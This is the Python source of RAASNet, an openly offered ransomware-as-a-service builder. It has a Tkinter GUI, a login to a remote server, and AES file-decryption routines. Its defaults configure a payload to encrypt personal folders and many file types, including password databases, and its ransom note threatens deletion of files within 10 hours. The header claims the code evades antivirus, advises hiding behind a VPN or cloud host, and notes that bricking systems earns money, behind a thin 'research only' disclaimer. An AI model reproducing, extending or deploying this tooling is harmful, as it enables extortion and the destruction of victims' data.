#!/usr/bin/env python3
'''
====================================== WELCOME TO RAASNet ==========================================

Your Ransomware As A Service (RAAS) Tool for all your hacking needs.

=========================================== INSTALLATION ===========================================
To use all features of this software, please do:
pip3 install -r requirements.txt

=========================================== PLEASE READ ===========================================

This was made to demonstrate ransomware and how easy it is to make.
It works on Windows, Linux and MacOS.
It's recommended to compile payload.py to EXE to make it more portable.

I do work on security awareness trainings and test the IT security and safety
for other companies and you guessed it; this was made for the demo section
of my presentation, NOT TO EARN MONEY OR BRICK PEOPLES COMPUTERS.

This script does not get detected by any anti-virus.
Self made scripts go undetected 99% of the time.
It's easy to write something nasty like ransomware, adware, malware, you name it.
Again, this script was for research only. Not ment to be used in the open world.
I am not responsible for any damage you may cause with this knowledge.

I recommend a VPN that allows port forwarding (For example; PIA VPN) when
using this outside your network, or better,
a cloud computer hosted elsewhere, like Amazon AWS.

The conclusion of this project is that it is easy to brick a system and earn money doing it.
This script doesn't use any exploits to achieve its goal,
but can easily be coded into it as a nice feature.

===================================================================================================
'''

# Headers
__author__ = "Leon Voerman"
__copyright__ = "Copyright 2019-2020, Incoming Security"
__license__ = "GPLv3"
__version__ = "1.2.8"
__maintainer__ = "Leon Voerman"
__email__ = "raasnet@protonmail.com"
__status__ = "Production"

import os, sys, subprocess, threading, time, datetime, socket, select, webbrowser, base64, platform, base64, requests, hashlib
from tkinter import *
from tkinter.ttk import *
from tkinter import messagebox
from tkinter.filedialog import askopenfilename
from tkinter.filedialog import askdirectory
from pymsgbox import *
from io import BytesIO
if platform.system() == 'Linux':
    from PIL import Image, ImageTk
else:
    import PIL.Image, PIL.ImageTk


from src.create_demon import *
from src.create_decrypt import *

try:
    from Crypto import Random
    from Crypto.Cipher import AES
    from pymsgbox import *
except ImportError as e:
    print('ERROR - Failed to import some modules.\n%s' % e)
    pass

try:
    import pyaes
except ImportError:
    print('ERROR - Failed to import some modules.\n%s' % e)


def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)

def dec_key():
    key = password(text='Please enter your decryption key', title='Enter Key', mask ='*')
    if key == None or key == '':
        messagebox.showwarning('Error', 'No key given. Canceled...')
        return False
    return key

def dec_path():
    path = askdirectory(title = 'Select directory with files to decrypt')
    if path == None or path == '':
        messagebox.showwarning('Error', 'No path selected, exiting...')
        return False
    path =  path + '/'
    return path

def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

def decrypt(ciphertext, key):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b"\0")

def decrypt_file(file_name, key):
    with open(file_name, 'rb') as f:
        ciphertext = f.read()
    dec = decrypt(ciphertext, key)
    with open(file_name[:-6], 'wb') as f:
        f.write(dec)

def decrypt_file_pyaes(file_name, key):
    aes = pyaes.AESModeOfOperationCTR(key)

    with open(file_name, 'rb') as fo:
        plaintext = fo.read()
    dec = aes.decrypt(plaintext)
    with open(file_name[:-6], 'wb') as fo:
        fo.write(dec)

def rename_file(file_name):
    os.rename(file_name, file_name[:-6])


class HoverButton(tk.Button):
    def __init__(self, master, **kw):
        tk.Button.__init__(self,master=master,**kw)
        self['bg']                 = '#545b62'
        self['activebackground']   = '#ef5350'
        self['fg']                 = 'white'
        self['relief']             = FLAT
        self['pady']               = 10
        self.defaultBackground     = self["bg"]

        self.bind("<Enter>", self.on_enter)
        self.bind("<Leave>", self.on_leave)

    def on_enter(self, e):
        self['background'] = self['activebackground']

    def on_leave(self, e):
        self['background'] = self.defaultBackground

class Login(Tk):
    def __init__(self):
        Tk.__init__(self)
        self.title(string = "Login")
        self.resizable(0,0)
        self.configure(background = 'white')

        self.bind("<Escape>", self.exit) # Press ESC to quit app

        self.options = {
            'username' : StringVar(),
            'pwd' : StringVar(),
            'reg_username' : StringVar(),
            'reg_name' : StringVar(),
            'reg_surname' : StringVar(),
            'reg_email' : StringVar(),
            'reg_password' : StringVar(),
            'reg_check_password' : StringVar(),
        }

        if platform.system() == 'Linux':
            photo = Image.open('images/login_img.png')
            resized = photo.resize((200,250), Image.ANTIALIAS)
            photo = ImageTk.PhotoImage(resized)

            photo2 = Image.open('images/an.jpg')
            resized2 = photo2.resize((318,500), Image.ANTIALIAS)
            photo2 = ImageTk.PhotoImage(resized2)
        else:
            photo = PIL.Image.open('images/login_img.png')
            resized = photo.resize((200,250), PIL.Image.ANTIALIAS)
            photo = PIL.ImageTk.PhotoImage(resized)

            photo2 = PIL.Image.open('images/an.jpg')
            resized2 = photo2.resize((320,500), PIL.Image.ANTIALIAS)
            photo2 = PIL.ImageTk.PhotoImage(resized2)

        label2 = Label(self, image=photo2, background = 'white')
        label2.image = photo2 # keep a reference!
        label2.grid(row = 0, column = 2, columnspan = 1, rowspan = 8)

        label = Label(self, image=photo, background = 'white')
        label.image = photo # keep a reference!
        label.grid(row = 0, column = 0, columnspan = 2)

        Label(self, text = 'Username', background = 'white', foreground = 'black', font='Helvetica 12 bold').grid(row = 1, column = 0, columnspan = 2)
        self.a = Entry(self, textvariable = self.options['username'], width = 31)
        self.a.grid(row = 2, column = 0, columnspan = 2)
        self.a.focus()

        Label(self, text = 'Password', background = 'white', foreground = 'black', font='Helvetica 12 bold').grid(row = 3, column = 0, columnspan = 2)
        Entry(self, textvariable = self.options['pwd'], show = '*', width = 31).grid(row = 4, column = 0, columnspan = 2)

        login_clk = HoverButton(self, text = 'Login', command = self.login, width = 35).grid(row = 5, column = 0, columnspan = 2, sticky = 'w')
        register_clk = HoverButton(self, text = 'Register', command = self.register, width = 35).grid(row = 6, column = 0, columnspan = 2, sticky = 'w')
        close = HoverButton(self, text = 'Exit', command = self.destroy, width = 35).grid(row = 7, column = 0, columnspan = 2, sticky = 'w')
        contact = HoverButton(self, text = 'Contact', command = self.contact, width = 35).grid(row = 7, column = 2, columnspan = 2, sticky = 'e')
        self.bind("<Return>", self.login_event) # Press ESC to quit app

    def login_event(self, event):
        self.login() # Redirect to login on event (hotkey is bound to <Return>)

    def login(self):
        # Check username and password
        check_pwd = hashlib.sha256(self.options['pwd'].get().encode('utf-8')).hexdigest()

        payload = {'user': self.options['username'].get(), 'pwd': check_pwd}

        r = requests.post('https://zeznzo.nl/login.py', data=payload)
        if r.status_code == 200:
            if r.text.startswith('[ERROR]'):
                messagebox.showwarning('ERROR', r.text.split('[ERROR] ')[1])
                return
            elif r.text.startswith('[OK]'):
                data = r.text[13:]
                data = data.split('\n')
                prof = {}

                try:
                    for i in data:
                        i = i.split('=')
                        prof[i[0]] = i[1]
                except Exception:
                    pass

                self.destroy()
                main = MainWindow(self.options['username'].get(), self.options['pwd'].get(), prof['Email'], prof['Name'], prof['Surname'], prof['Rank'], prof['Status'])
                main.mainloop()
        else:
            messagebox.showwarning('ERROR', 'Failed to contact login server!\n%i' % r.status_code)
            return

    def exit(self, event):
        sys.exit(0)

    def register(self):
        self.reg = Toplevel()
        self.reg.title(string = 'Register')
        self.reg.configure(background = 'white')
        self.reg.resizable(0,0)

        if platform.system() == 'Linux':
            reg_photo = Image.open('images/reg.png')
            resized = reg_photo.resize((200,250), Image.ANTIALIAS)
            reg_photo = ImageTk.PhotoImage(resized)
        else:
            reg_photo = PIL.Image.open('images/reg.png')
            resized = reg_photo.resize((200,250), PIL.Image.ANTIALIAS)
            reg_photo = PIL.ImageTk.PhotoImage(resized)

        label = Label(self.reg, image=reg_photo, background = 'white')
        label.image = reg_photo # keep a reference!
        label.grid(row = 0, column = 0, columnspan = 2)

        check = '' # Confirm password variable

        Label(self.reg, text = 'Username', background = 'white').grid(row = 1, column = 0, columnspan = 2)
        self.options['reg_username'] = Entry(self.reg, textvariable = self.options['reg_username'], width = 30)
        self.options['reg_username'].grid(row = 2, column = 0, columnspan = 2)
        self.options['reg_username'].focus()

        Label(self.reg, text = 'Name', background = 'white').grid(row = 3, column = 0, columnspan = 2)
        self.options['reg_name'] = Entry(self.reg, textvariable = self.options['reg_name'], width = 30)
        self.options['reg_name'].grid(row = 4, column = 0, columnspan = 2)

        Label(self.reg, text = 'Surname', background = 'white').grid(row = 5, column = 0, columnspan = 2)
        self.options['reg_surname'] = Entry(self.reg, textvariable = self.options['reg_surname'], width = 30)
        self.options['reg_surname'].grid(row = 6, column = 0, columnspan = 2)

        Label(self.reg, text = 'Email', background = 'white').grid(row = 7, column = 0, columnspan = 2)
        self.options['reg_email'] = Entry(self.reg, textvariable = self.options['reg_email'], width = 30)
        self.options['reg_email'].grid(row = 8, column = 0, columnspan = 2)

        Label(self.reg, text = 'Password', background = 'white').grid(row = 9, column = 0, columnspan = 2)
        self.options['reg_password'] = Entry(self.reg, textvariable = self.options['reg_password'], width = 30, show = '*')
        self.options['reg_password'].grid(row = 10, column = 0, columnspan = 2)

        Label(self.reg, text = 'Confirm Password', background = 'white').grid(row = 11, column = 0, columnspan = 2)
        self.options['reg_check_password'] = Entry(self.reg, textvariable = self.options['reg_check_password'], width = 30, show = '*')
        self.options['reg_check_password'].grid(row = 12, column = 0, columnspan = 2)

        register_button = HoverButton(self.reg, text = 'Register', command = self.register_user, width = 35)
        register_button.grid(row = 13, column = 0, columnspan = 2)
        self.reg.bind('<Return>', self.register_user_event)
        close_register = HoverButton(self.reg, text = 'Cancel', command = self.reg.destroy, width = 35).grid(row = 14, column = 0, columnspan = 2)

    def contact(self):
        self.contact = Toplevel()
        self.contact.title(string = 'Contact')
        self.contact.configure(background = 'white')
        self.contact.resizable(0,0)

        #self.bind("<Escape>", self.close_contact) # Press ESC to quit app

        if platform.system() == 'Linux':
            photo = Image.open(resource_path('images/incsec_full.png'))
            resized = photo.resize((350,150), Image.ANTIALIAS)
            photo = ImageTk.PhotoImage(resized)
        else:
            photo = PIL.Image.open(resource_path('images/incsec_full.png'))
            resized = photo.resize((300,100), PIL.Image.ANTIALIAS)
            photo = PIL.ImageTk.PhotoImage(resized)

        label = Label(self.contact, image=photo, background = 'white')
        label.image = photo # keep a reference!
        label.grid(row = 0, column = 0, columnspan = 2)

        Label(self.contact, text = 'Twitter: ', background = 'white').grid(row = 1, column = 0, sticky = 'w')
        Label(self.contact, text = '@TheRealZeznzo', background = 'white').grid(row = 1, column = 1, sticky = 'w')

        Label(self.contact, text = 'LinkedIn: ', background = 'white').grid(row = 2, column = 0, sticky = 'w')
        Label(self.contact, text = 'Leon Voerman', background = 'white').grid(row = 2, column = 1, sticky = 'w')

        Label(self.contact, text = 'GitHub: ', background = 'white').grid(row = 3, column = 0, sticky = 'w')
        Label(self.contact, text = 'leonv024', background = 'white').grid(row = 3, column = 1, sticky = 'w')

        Label(self.contact, text = 'Email: ', background = 'white').grid(row = 4, column = 0, sticky = 'w')
        Label(self.contact, text = 'raasnet@protonmail.com', background = 'white').grid(row = 4, column = 1, sticky = 'w')

        Label(self.contact, text = 'Rank: ', background = 'white').grid(row = 5, column = 0, sticky = 'w')
        Label(self.contact, text = 'Root Admin', background = 'white').grid(row = 5, column = 1, sticky = 'w')

        Label(self.contact, text = 'Status: ', background = 'white').grid(row = 6, column = 0, sticky = 'w')
        Label(self.contact, text = 'Active', background = 'white').grid(row = 6, column = 1, sticky = 'w')
        close_contact = HoverButton(self.contact, text = 'Close', command = self.contact.destroy, width = 35).grid(row = 7, column = 0, columnspan = 2)

    def register_user_event(self, event):
        self.register_user()

    def register_user(self):
        # Check if passwords match
        if not self.options['reg_password'].get() == self.options['reg_check_password'].get():
            messagebox.showwarning('ERROR', 'Passwords do not match!')
            return
        else:
            pass

        # Check if every entry was filled
        if self.options['reg_username'].get() == '' or self.options['reg_password'].get() == '' or self.options['reg_name'].get() == '' or self.options['reg_surname'].get() == ''  or self.options['reg_email'].get() == '' :
            messagebox.showwarning("ERROR", "Not all fields were filled!")
            return
        else:
            pass

        # check if username already exists
        try:
            payload = {'user': self.options['reg_username'].get(), 'pwd': hashlib.sha256(self.options['reg_password'].get().encode('utf-8')).hexdigest(), 'name' : self.options['reg_name'].get(), 'surname' : self.options['reg_surname'].get(), 'email' : self.options['reg_email'].get()}

            r = requests.post('https://zeznzo.nl/reg.py', data=payload)
            if r.status_code == 200:
                if r.text.startswith('[ERROR]'):
                    messagebox.showwarning('ERROR', r.text.split('[ERROR] ')[1])
                    return
                else:
                    messagebox.showinfo('INFO', 'User registered!')

            else:
                messagebox.showwarning('ERROR', 'Failed to register!\n%i' % r.status_code)
                return

        except Exception as e:
            messagebox.showwarning('ERROR', '%s' % e)
            return

        self.reg.destroy()

class MainWindow(Tk):
    def __init__(self, username, password, email, name, surname, rank, status):
        Tk.__init__(self)
        self.title(string = "RAASNet v%s" % __version__) # Set window title
        self.resizable(0,0) # Do not allow to be resized

        # Top menu
        menu = Menu(self)
        # File dropdown
        filemenu = Menu(menu, tearoff=0)
        filemenu.add_command(label="Quit", command=self.exit)
        menu.add_cascade(label="File", menu=filemenu)

        # Help dropdown
        help = Menu(menu, tearoff=0)
        help.add_command(label="View License", command=self.show_license)
        help.add_command(label="Visit Project on GitHub", command=self.open_github)
        menu.add_cascade(label="Help", menu=help)

        self.config(background = 'white', menu=menu)

        # Input field data is being inserted in this dict
        self.options = {
            'agreed' : IntVar(),
            'host' : StringVar(),
            'port' : IntVar(),
            'save_keys' : IntVar(),
            'remote' : StringVar(),
            'local' : StringVar(),
            'platform' : StringVar(),
            'key' : StringVar(),
            'os' : StringVar(),
            'full_screen_var' : IntVar(),
            'mode' : IntVar(),
            'demo' : IntVar(),
            'type' : StringVar(),
            'method' : StringVar(),
            'icon_path' : StringVar(),
            'payload_path' : StringVar(),
            'decryptor_path' : StringVar(),
            'msg' : StringVar(),
            'new_msg' : StringVar(),
            'img_base64' : StringVar(),
            'debug' : IntVar(),
            'ext' : StringVar(),
            'target_ext' : StringVar(),
            'new_target_ext' : StringVar(),
            'target_dirs' : StringVar(),
            'new_target_dirs' : StringVar(),
            'working_dir' : StringVar(),
            'new_working_dir' : StringVar(),
            'remove_payload' : IntVar(),
            'runas' : IntVar(),

            'username' : StringVar(),
            'password' : StringVar(),
            'email' : StringVar(),
            'name' : StringVar(),
            'surname' : StringVar(),
            'rank' : StringVar(),
            'status' : StringVar(),
            'inf_counter' : IntVar(),

        }


        #<activate>

        if not self.options['agreed'].get() == 1:
            self.show_license()

        # Load profile
        self.options['username'].set(username)
        self.options['password'].set(password)
        self.options['email'].set(email)
        self.options['name'].set(name)
        self.options['surname'].set(surname)
        self.options['rank'].set(rank)
        self.options['status'].set(status)
        self.options['inf_counter'].set(0)

        # Default Settings
        self.options['host'].set('127.0.0.1')
        self.options['port'].set(8989)
        self.options['save_keys'].set(0)
        self.options['full_screen_var'].set(0)
        self.options['mode'].set(1)
        self.options['demo'].set(0)
        self.options['type'].set('pycrypto')
        self.options['method'].set('override')
        self.options['debug'].set(0)
        self.options['ext'].set('.DEMON')
        self.options['remove_payload'].set(0)
        self.options['runas'].set(0)
        self.options['working_dir'].set('$HOME')

        self.options['target_dirs'].set('''Downloads
Documents
Pictures
Music
Desktop
Onedrive''')
        self.options['target_ext'].set('''txt
ppt
pptx
doc
docx
gif
jpg
png
ico
mp3
ogg
csv
xls
exe
pdf
ods
odt
kdbx
kdb
mp4
flv
iso
zip
tar
tar.gz
rar''')

        self.options['msg'].set('''Tango Down!

Seems like you got hit by DemonWare ransomware!

Don't Panic, you get have your files back!

DemonWare uses a basic encryption script to lock your files.
This type of ransomware is known as CRYPTO.
You'll need a decryption key in order to unlock your files.

Your files will be deleted when the timer runs out, so you better hurry.
You have 10 hours to find your key

C'mon, be glad I don't ask for payment like other ransomware.

Please visit: https://keys.zeznzo.nl and search for your IP/hostname to get your key.

Kind regards,

Zeznzo
''')
        self.options['img_base64'].set('''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
